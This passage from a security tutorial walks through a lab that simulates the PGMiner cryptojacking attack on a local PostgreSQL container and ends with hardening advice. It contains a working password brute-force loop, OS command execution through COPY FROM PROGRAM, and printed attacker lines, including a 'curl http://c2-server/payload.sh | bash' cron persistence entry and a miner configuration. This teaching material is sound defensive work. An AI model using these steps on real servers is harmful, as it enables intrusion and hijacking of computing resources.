echo "Password: postgres (or none, because trust auth)"
echo ""
echo "Now run the attack simulation: bash attack-simulation.sh"
```

### The Attack Simulation Script

This script simulates every phase of the PGMiner attack with **safe, harmless commands** that let you observe what would happen at each step.

```bash
#!/bin/bash
# File: attack-simulation.sh
# Purpose: Simulate PGMiner attack phases with safe, observable commands
# This does NOT download or execute any actual malware

set -e

# Colors for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
PURPLE='\033[0;35m'
CYAN='\033[0;36m'
NC='\033[0m' # No Color
BOLD='\033[1m'

TARGET_HOST="127.0.0.1"
TARGET_PORT="15432"

print_phase() {
    echo ""
    echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
    echo -e "${BOLD}${1}${NC}"
    echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
    echo ""
}

print_explain() {
    echo -e "${CYAN}📖 EXPLANATION:${NC} $1"
    echo ""
}

print_attack() {
    echo -e "${RED}🔴 ATTACKER ACTION:${NC} $1"
}

print_result() {
    echo -e "${GREEN}📊 RESULT:${NC}"
}

print_warn() {
    echo -e "${YELLOW}⚠️  $1${NC}"
}

pause() {
    echo ""
    echo -e "${PURPLE}Press Enter to continue to the next phase...${NC}"
    read -r
}

# ============================================================
# PHASE 1: RECONNAISSANCE
# ============================================================
print_phase "PHASE 1: RECONNAISSANCE — Port Scanning"

print_explain "In a real PGMiner attack, the botnet scans entire IP ranges for
hosts with port 5432 open. It uses masscan or similar tools to sweep
millions of IPs quickly. We simulate this with a targeted check."

print_attack "Scanning target for PostgreSQL service on port 5432..."
echo ""
echo "  Command: nc -zv $TARGET_HOST $TARGET_PORT"
echo ""

if nc -zv $TARGET_HOST $TARGET_PORT 2>&1; then
    echo ""
    echo -e "${RED}  ✅ Port 5432 is OPEN — target added to brute-force queue${NC}"
else
    echo -e "${GREEN}  ❌ Port 5432 is CLOSED — target skipped${NC}"
    echo "  The lab server may not be running. Start it with: bash lab-setup.sh"
    exit 1
fi

print_explain "What happened: The scanner sent a TCP SYN packet to port $TARGET_PORT.
The server responded with SYN-ACK, confirming PostgreSQL is listening.
This is identical to what happens when PGMiner scans cloud IP ranges.

A properly firewalled server would DROP the SYN packet silently,
giving the scanner no response and no confirmation that the port exists."

pause

# ============================================================
# PHASE 2: BRUTE-FORCE
# ============================================================
print_phase "PHASE 2: BRUTE-FORCE — Password Cracking"

print_explain "PGMiner tries a short list of common passwords against the 'postgres'
superuser account. In our lab, the server uses trust authentication,
so ANY password (or no password) works. We demonstrate both scenarios."

# Try common passwords
PASSWORDS=("" "postgres" "password" "123456" "admin")
FOUND=false

for pwd in "${PASSWORDS[@]}"; do
    if [ -z "$pwd" ]; then
        display_pwd="(empty)"
    else
        display_pwd="$pwd"
    fi

    print_attack "Trying password: '$display_pwd' for user 'postgres'..."

    # Try to connect
    if PGPASSWORD="$pwd" psql -h $TARGET_HOST -p $TARGET_PORT -U postgres \
        -c "SELECT 1;" > /dev/null 2>&1; then
        echo -e "  ${RED}✅ SUCCESS — Password '$display_pwd' works!${NC}"
        FOUND=true
        WORKING_PWD="$pwd"
        break
    else
        echo -e "  ${GREEN}❌ Failed${NC}"
    fi
done

if [ "$FOUND" = true ]; then
    echo ""
    echo -e "${RED}  🚨 BRUTE-FORCE SUCCESSFUL${NC}"
    echo "  User: postgres (superuser)"
    echo "  Password: $WORKING_PWD"
    echo ""
    print_explain "What happened: The attacker tried common passwords sequentially.
Because the server uses trust authentication, even an empty password
was accepted. In a real attack, this phase often takes less than a second
because 'postgres' with password 'postgres' is the first combination tried.

A server with a strong password and fail2ban would:
1. Reject all these passwords
2. Ban the attacker's IP after 5 failed attempts
3. Log every failed attempt for the administrator to review"
else
    echo "  All passwords failed. Server may have strong authentication."
    exit 1
fi

pause

# ============================================================
# PHASE 3: INITIAL ACCESS — COPY FROM PROGRAM
# ============================================================
print_phase "PHASE 3: INITIAL ACCESS — COPY FROM PROGRAM Exploitation"

print_explain "This is the core exploit. The attacker uses PostgreSQL's COPY FROM PROGRAM
feature to execute operating system commands. This feature is designed for
superusers to import data from external programs, but an attacker uses it
to run arbitrary shell commands on the host.

We will demonstrate three commands that show the severity:"

echo ""
echo -e "${BOLD}Step 3a: Identify the operating system${NC}"
print_attack "Executing: COPY FROM PROGRAM 'uname -a'"
echo ""

PGPASSWORD="$WORKING_PWD" psql -h $TARGET_HOST -p $TARGET_PORT -U postgres << 'SQL'
DROP TABLE IF EXISTS cmd_exec;
CREATE TABLE cmd_exec (cmd_output TEXT);
COPY cmd_exec FROM PROGRAM 'uname -a';
SELECT * FROM cmd_exec;
DROP TABLE cmd_exec;
SQL

print_explain "What happened: The SQL command COPY cmd_exec FROM PROGRAM 'uname -a'
caused PostgreSQL to:
1. fork() a child process
2. Execute 'uname -a' as the postgres OS user
3. Capture stdout into the cmd_exec table
4. The attacker now knows the OS, kernel version, and architecture"

echo ""
echo -e "${BOLD}Step 3b: Identify the current user and privileges${NC}"
print_attack "Executing: COPY FROM PROGRAM 'id && whoami'"
echo ""

PGPASSWORD="$WORKING_PWD" psql -h $TARGET_HOST -p $TARGET_PORT -U postgres << 'SQL'
DROP TABLE IF EXISTS cmd_exec;
CREATE TABLE cmd_exec (cmd_output TEXT);
COPY cmd_exec FROM PROGRAM 'id';
SELECT * FROM cmd_exec;
DROP TABLE cmd_exec;
SQL

print_explain "What happened: The 'id' command reveals what OS user PostgreSQL runs as.
If it shows 'uid=0(root)' — the attacker has root access immediately.
If it shows 'uid=999(postgres)' — the attacker runs as the postgres user,
which still has significant access to the system."

echo ""
echo -e "${BOLD}Step 3c: List running processes (recon for competing miners)${NC}"
print_attack "Executing: COPY FROM PROGRAM 'ps aux --sort=-pcpu | head -10'"
echo ""

PGPASSWORD="$WORKING_PWD" psql -h $TARGET_HOST -p $TARGET_PORT -U postgres << 'SQL'
DROP TABLE IF EXISTS cmd_exec;
CREATE TABLE cmd_exec (cmd_output TEXT);
COPY cmd_exec FROM PROGRAM 'ps aux --sort=-pcpu | head -10';
SELECT * FROM cmd_exec;
DROP TABLE cmd_exec;
SQL

print_explain "What happened: The attacker lists the top CPU-consuming processes.
This serves two purposes:
1. Check if another miner is already running (to kill it)
2. Understand what services the server runs (to avoid disrupting
   services that might alert the admin)"

pause

# ============================================================
# PHASE 4: PAYLOAD STAGING
# ============================================================
print_phase "PHASE 4: PAYLOAD STAGING — Simulated Payload Download"

print_explain "In a real PGMiner attack, this phase downloads the actual malware from
a command-and-control (C2) server. The attacker uses curl or wget to fetch
a shell script, which then downloads the XMRig miner binary.

We simulate this by creating a harmless 'payload' locally."

print_attack "Simulating: curl http://c2-server/payload.sh | bash"
echo ""
echo "  In reality, this command would:"
echo "  1. Connect to the attacker's C2 server"
echo "  2. Download a shell script (the stager)"
echo "  3. Pipe it directly to bash for execution"
echo ""
echo "  We simulate with a safe local command:"
echo ""

PGPASSWORD="$WORKING_PWD" psql -h $TARGET_HOST -p $TARGET_PORT -U postgres << 'SQL'
DROP TABLE IF EXISTS cmd_exec;
CREATE TABLE cmd_exec (cmd_output TEXT);

-- Simulated payload: instead of downloading malware,
-- we just write a harmless marker file
COPY cmd_exec FROM PROGRAM 'echo "SIMULATED_PGMINER_PAYLOAD_$(date +%s)" > /tmp/pgminer_lab_marker.txt && echo "Payload staged at /tmp/pgminer_lab_marker.txt"';
SELECT * FROM cmd_exec;
DROP TABLE cmd_exec;
SQL

echo ""
print_explain "What happened: In a real attack, this step would:
1. curl/wget downloads a ~2KB shell script from the C2 server
2. The script is piped to bash: curl http://c2/payload.sh | bash
3. The script identifies the CPU architecture (x86_64, aarch64, etc.)
4. Downloads the appropriate XMRig binary for that architecture
5. Makes it executable with chmod +x
6. Stores it in /tmp with a hidden filename like /tmp/.X11-unix

We used a harmless echo command instead to create a marker file."

pause

# ============================================================
# PHASE 5: ENVIRONMENT PREPARATION
# ============================================================
print_phase "PHASE 5: ENVIRONMENT PREPARATION — Killing Competitors"

print_explain "Before deploying its own miner, PGMiner kills other known cryptocurrency
miners that may already be running on the system. This is a common behavior
in cryptojacking botnets — they actively compete with each other.

We simulate by searching for (but NOT killing) known miner process names."

print_attack "Checking for competing miners (simulation only — not actually killing)..."
echo ""

KNOWN_MINERS=("kdevtmpfsi" "kinsing" "xmrig" "xmr-stak" "kthreaddi" "sysrv" "dbused" "solrd")

for miner in "${KNOWN_MINERS[@]}"; do
    result=$(PGPASSWORD="$WORKING_PWD" psql -h $TARGET_HOST -p $TARGET_PORT -U postgres -t -c \
        "DROP TABLE IF EXISTS cmd_exec; CREATE TABLE cmd_exec (cmd_output TEXT);
         COPY cmd_exec FROM PROGRAM 'pgrep -f $miner 2>/dev/null || echo NOT_FOUND';
         SELECT cmd_output FROM cmd_exec; DROP TABLE cmd_exec;" 2>/dev/null | tr -d ' ')

    if [ "$result" = "NOT_FOUND" ] || [ -z "$result" ]; then
        echo "  ✓ $miner — not found (clean)"
    else
        echo -e "  ${RED}✗ $miner — FOUND (PID: $result) — would be killed${NC}"
    fi
done

echo ""
print_explain "What happened: PGMiner checks for 8+ known mining malware families.
If any are found, it kills them with 'pkill -9 -f <name>'.
It also:
- Removes their cron jobs
- Deletes their binaries from /tmp
- Clears iptables rules they may have added
- Stops cloud security agents (Alibaba Cloud, Tencent Cloud)

This 'turf war' between botnets is well-documented in threat research."

pause

# ============================================================
# PHASE 6: PERSISTENCE
# ============================================================
print_phase "PHASE 6: PERSISTENCE — Installing Survival Mechanisms"

print_explain "PGMiner installs multiple persistence mechanisms to survive cleanup
attempts and reboots. We demonstrate what these look like WITHOUT
actually installing them."

echo -e "${BOLD}Persistence Mechanism 1: Cron Job${NC}"
echo ""
print_attack "What PGMiner would add to crontab:"
echo ""
echo '  * * * * * curl -s http://c2-server/payload.sh | bash'
echo ""
echo "  This runs every minute, re-downloading and executing the payload."
echo "  If an admin kills the miner, it comes back within 60 seconds."
echo ""

echo -e "${BOLD}Persistence Mechanism 2: Hidden Files${NC}"
echo ""
print_attack "What PGMiner would create:"
echo ""
echo "  /tmp/.X11-unix/.rsync     (miner binary, hidden in X11 socket dir)"
echo "  /tmp/.X11-unix/.config    (miner config)"
echo "  /var/tmp/.cache/.update   (backup copy)"
echo ""
echo "  Files starting with '.' are hidden from basic 'ls' commands."
echo "  Using system-looking paths like .X11-unix avoids suspicion."
echo ""

echo -e "${BOLD}Persistence Mechanism 3: Process Name Spoofing${NC}"
echo ""
print_attack "What PGMiner does to hide in plain sight:"
echo ""
echo '  The miner process renames itself to look like a system process:'
echo '  - "[kworker/0:2]"  (looks like a kernel worker thread)'
echo '  - "[migration/0]"  (looks like a CPU migration thread)'
echo '  - "postgres: stats collector" (looks like a PostgreSQL process)'
echo ""

# Demonstrate checking crontab via COPY FROM PROGRAM
echo -e "${BOLD}Checking current crontab (verifying no persistence installed):${NC}"
echo ""
PGPASSWORD="$WORKING_PWD" psql -h $TARGET_HOST -p $TARGET_PORT -U postgres << 'SQL'
DROP TABLE IF EXISTS cmd_exec;
CREATE TABLE cmd_exec (cmd_output TEXT);
COPY cmd_exec FROM PROGRAM 'crontab -l 2>&1 || echo "No crontab configured"';
SELECT * FROM cmd_exec;
DROP TABLE cmd_exec;
SQL

print_explain "What happened: We showed what persistence mechanisms look like without
installing them. In a real attack, all three mechanisms would be active
simultaneously, making cleanup difficult — you must find and remove ALL
of them, or the miner comes back."

pause

# ============================================================
# PHASE 7: MINING (SIMULATED)
# ============================================================
print_phase "PHASE 7: CRYPTO MINING — Simulated Miner Execution"

print_explain "In a real attack, XMRig would now be running and consuming 75-100%
of the server's CPU to mine Monero. We simulate this by showing what
the miner configuration looks like and running a CPU stress test."

echo -e "${BOLD}Simulated XMRig Configuration:${NC}"
echo ""
cat << 'MINER_CONFIG'
{
    "autosave": false,
    "donate-level": 0,
    "cpu": {
        "enabled": true,
        "max-threads-hint": 75,
        "priority": null
    },
    "opencl": false,
    "cuda": false,
    "pools": [
        {
            "url": "pool.minexmr.com:4444",
            "user": "4ATTACKER_WALLET_ADDRESS_REDACTED",
            "pass": "victim-server-001",
            "keepalive": true,
            "tls": false
        }
    ],
    "print-time": 60,
    "health-print-time": 60,
    "retries": 5,
    "retry-pause": 5,
    "syslog": false,
    "log-file": null,
    "colors": false,
    "background": true
}
MINER_CONFIG

echo ""
echo -e "${BOLD}Simulating CPU load (5 seconds only):${NC}"
echo ""

# Run a brief CPU stress test via PostgreSQL to demonstrate the impact
PGPASSWORD="$WORKING_PWD" psql -h $TARGET_HOST -p $TARGET_PORT -U postgres << 'SQL'
DROP TABLE IF EXISTS cmd_exec;
CREATE TABLE cmd_exec (cmd_output TEXT);

-- Simulate brief CPU load (harmless, 3-second stress)
COPY cmd_exec FROM PROGRAM 'echo "Starting simulated mining..." && timeout 3 dd if=/dev/urandom bs=1M count=50 of=/dev/null 2>&1 | tail -1 && echo "Simulated mining complete (3 seconds)"';
SELECT * FROM cmd_exec;
DROP TABLE cmd_exec;
SQL

echo ""
print_explain "What happened: In a real attack, XMRig would:
1. Connect to the mining pool (e.g., minexmr.com:4444)
2. Receive mining jobs (cryptographic hash challenges)
3. Use 75% of CPU cores to solve RandomX proof-of-work
4. Submit solutions back to the pool
5. Earnings go to the attacker's Monero wallet

Observable symptoms on a compromised server:
- CPU usage sustained at 75-100%
- Increased electricity/cloud bills
- Legitimate services become slow
- Fan noise increases on physical servers
- Outbound connections to mining pool IPs"

pause

# ============================================================
# PHASE 8: LATERAL SPREAD
# ============================================================
print_phase "PHASE 8: LATERAL SPREAD — Scanning for More Targets"

print_explain "After establishing itself, PGMiner scans for more vulnerable PostgreSQL
instances. It scans both the local network and random internet IP ranges.
We simulate by checking what network information the attacker can gather."

print_attack "Gathering network information for lateral movement..."
echo ""

PGPASSWORD="$WORKING_PWD" psql -h $TARGET_HOST -p $TARGET_PORT -U postgres << 'SQL'
DROP TABLE IF EXISTS cmd_exec;
CREATE TABLE cmd_exec (cmd_output TEXT);

-- Gather network configuration
COPY cmd_exec FROM PROGRAM 'echo "=== Network Interfaces ===" && hostname -I 2>/dev/null || echo "hostname command not available"';
SELECT * FROM cmd_exec;
DROP TABLE cmd_exec;
SQL

echo ""
print_explain "What happened: The attacker collects:
1. Internal IP addresses (to identify the subnet)
2. Network interfaces (to find other network segments)
3. ARP table (to find other hosts on the same network)
4. /etc/hosts (to find named internal services)

With this information, PGMiner would scan the local subnet for
more PostgreSQL instances, repeating the entire attack chain."

pause

# ============================================================
# CLEANUP
# ============================================================
print_phase "LAB CLEANUP"

echo "Cleaning up simulation artifacts..."
echo ""

# Remove the marker file
PGPASSWORD="$WORKING_PWD" psql -h $TARGET_HOST -p $TARGET_PORT -U postgres << 'SQL'
DROP TABLE IF EXISTS cmd_exec;
CREATE TABLE cmd_exec (cmd_output TEXT);
COPY cmd_exec FROM PROGRAM 'rm -f /tmp/pgminer_lab_marker.txt && echo "Marker file removed"';
SELECT * FROM cmd_exec;
DROP TABLE cmd_exec;
SQL

echo ""
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
echo -e "${BOLD}${GREEN}SIMULATION COMPLETE${NC}"
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
echo ""
echo "You have observed all 8 phases of a PGMiner attack:"
echo ""
echo "  Phase 1: Reconnaissance  — Port scanning for PostgreSQL"
echo "  Phase 2: Brute-Force     — Cracking the postgres password"
echo "  Phase 3: Initial Access  — COPY FROM PROGRAM exploitation"
echo "  Phase 4: Payload Staging — Downloading the miner (simulated)"
echo "  Phase 5: Environment Prep — Killing competing miners"
echo "  Phase 6: Persistence     — Installing survival mechanisms"
echo "  Phase 7: Mining           — Running the cryptocurrency miner"
echo "  Phase 8: Lateral Spread  — Scanning for more targets"
echo ""
echo "To destroy the lab environment:"
echo "  cd pgminer-lab && docker compose down -v"
echo ""
echo "To harden a real PostgreSQL server, review Part 4 of the article."
```

### What Happens at Each Step — Detailed Breakdown

Let us trace through the simulation line by line, connecting each action to the real PGMiner behavior.

```mermaid
sequenceDiagram
    participant A as Attacker (Script)
    participant PG as PostgreSQL (Lab)
    participant OS as Container OS
    participant Note as What PGMiner Would Do

    rect rgb(52, 152, 219)
        Note over A,Note: Phase 1 — Reconnaissance
        A->>PG: nc -zv 127.0.0.1 15432
        PG->>A: Connection accepted
        Note over Note: Real PGMiner: masscan<br/>millions of IPs
    end

    rect rgb(230, 126, 34)
        Note over A,Note: Phase 2 — Brute-Force
        A->>PG: PGPASSWORD='' psql -U postgres
        PG->>A: Authentication OK (trust)
        Note over Note: Real PGMiner: tries 5-10<br/>common passwords
    end

    rect rgb(231, 76, 60)
        Note over A,Note: Phase 3 — Initial Access
        A->>PG: COPY cmd_exec FROM PROGRAM 'uname -a'
        PG->>OS: fork() + exec("uname -a")
        OS->>PG: Linux x86_64 output
        PG->>A: Returns OS information
        Note over Note: Real PGMiner: runs<br/>curl http://c2/payload | bash
    end

    rect rgb(142, 68, 173)
        Note over A,Note: Phase 4-6 — Payload + Persistence
        A->>PG: COPY FROM PROGRAM 'echo marker > /tmp/...'
        PG->>OS: Creates marker file
        Note over Note: Real PGMiner: downloads XMRig,<br/>installs cron job,<br/>kills competing miners
    end

    rect rgb(44, 62, 80)
        Note over A,Note: Phase 7 — Mining
        A->>PG: COPY FROM PROGRAM 'dd if=/dev/urandom...'
        PG->>OS: Brief CPU stress (3 seconds)
        Note over Note: Real PGMiner: XMRig runs<br/>indefinitely at 75% CPU
    end
```

### Lab Summary Table

| Phase | Simulation Command | Real PGMiner Action | Damage Level |
|-------|-------------------|---------------------|--------------|
| 1. Recon | `nc -zv target 5432` | masscan entire internet for port 5432 | 🟡 Low |
| 2. Brute-force | `psql -U postgres` with common passwords | Same, but automated across thousands of IPs | 🟠 Medium |
| 3. Initial access | `COPY FROM PROGRAM 'uname -a'` | `COPY FROM PROGRAM 'curl c2/payload.sh \| bash'` | 🔴 Critical |
| 4. Payload | `echo marker > /tmp/file` | Downloads XMRig binary from C2 server | 🔴 Critical |
| 5. Preparation | `pgrep` known miner names | `pkill -9` competing miners, disable security | 🔴 Critical |
| 6. Persistence | Display persistence methods | Install cron job + systemd service + watchdog | 🔴 Critical |
| 7. Mining | 3-second `dd` CPU stress | XMRig at 75% CPU indefinitely | 🔴 Critical |
| 8. Spread | `hostname -I` network recon | Scan subnet + internet for more targets | 🔴 Critical |

### Tearing Down the Lab

```bash
# Stop and remove the vulnerable container:
cd pgminer-lab
docker compose down -v

# Remove all lab files:
cd ..
rm -rf pgminer-lab

echo "Lab environment completely removed."
```

---

## Final Thoughts

PGMiner is not a sophisticated attack. It does not exploit a zero-day vulnerability. It does not use advanced evasion techniques. It simply exploits the gap between what PostgreSQL **can** do and what administrators **let** it do.

The full defense is straightforward:

1. **Never expose port 5432 to the internet** — use a firewall
2. **Never use weak passwords** — use long, random passwords with SCRAM-SHA-256
3. **Never use trust authentication** for remote connections
4. **Revoke `pg_execute_server_program`** from all non-essential roles
5. **Monitor CPU usage** — a sudden spike to 75%+ is a red flag
6. **Log everything** — failed auth attempts, connections, DDL statements

```mermaid
flowchart TD
    A["Is port 5432 exposed<br/>to the internet?<br/>&nbsp;"]
    A -->|Yes| FIX1["🔧 Add firewall rule<br/>Block public access<br/>&nbsp;"]
    A -->|No| B

    B["Is the postgres password<br/>strong and unique?<br/>&nbsp;"]
    B -->|No| FIX2["🔧 Set strong password<br/>Use SCRAM-SHA-256<br/>&nbsp;"]
    B -->|Yes| C

    C["Is pg_hba.conf using<br/>trust for remote hosts?<br/>&nbsp;"]
    C -->|Yes| FIX3["🔧 Change to<br/>scram-sha-256<br/>&nbsp;"]
    C -->|No| D

    D["Is pg_execute_server_program<br/>revoked from PUBLIC?<br/>&nbsp;"]
    D -->|No| FIX4["🔧 REVOKE pg_execute_server_program<br/>FROM PUBLIC<br/>&nbsp;"]
    D -->|Yes| E

    E["Is CPU monitoring<br/>enabled with alerts?<br/>&nbsp;"]
    E -->|No| FIX5["🔧 Set up monitoring<br/>(Prometheus, CloudWatch, etc.)<br/>&nbsp;"]
    E -->|Yes| SAFE

    SAFE["✅ Your PostgreSQL server<br/>is hardened against PGMiner<br/>&nbsp;"]

    style SAFE fill:#27ae60,color:#fff
    style FIX1 fill:#e74c3c,color:#fff
    style FIX2 fill:#e74c3c,color:#fff
    style FIX3 fill:#e74c3c,color:#fff
    style FIX4 fill:#e74c3c,color:#fff
    style FIX5 fill:#e74c3c,color:#fff
```

The entire attack chain breaks at any single point. Fix any one of these and PGMiner cannot complete its mission. Fix all of them and your PostgreSQL server is genuinely hardened.

---

## References

- [Palo Alto Networks Unit 42 — PGMiner: New Cryptocurrency Mining Botnet Delivered via PostgreSQL (December 10, 2020)](https://unit42.paloaltonetworks.com/pgminer-postgresql-cryptocurrency-mining-botnet/)
- [PostgreSQL Documentation — COPY FROM PROGRAM](https://www.postgresql.org/docs/current/sql-copy.html)
- [CVE-2019-9193 — NIST NVD Entry (Disputed)](https://nvd.nist.gov/vuln/detail/CVE-2019-9193)
- [PostgreSQL Security Hardening Guide](https://www.postgresql.org/docs/current/auth-pg-hba-conf.html)
- [XMRig — Open Source Monero Miner (Legitimate Tool Abused by Attackers)](https://github.com/xmrig/xmrig)
